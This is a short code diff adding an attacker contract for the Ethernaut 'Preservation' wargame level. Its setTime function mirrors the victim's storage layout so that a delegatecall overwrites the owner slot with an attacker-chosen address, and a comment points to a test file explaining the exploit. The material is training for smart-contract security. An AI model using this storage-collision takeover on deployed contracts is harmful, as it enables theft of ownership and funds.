@@ -41,6 +41,13 @@ contract LibraryContract {
     }
 }
 
+//See `test/Week17-18/EthernautPreservation.t.sol` for the exploit explanation.
 contract AttackPreservation {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
 
+    function setTime(uint _time) public {
+        owner = address(uint160(_time));
+    }
 }
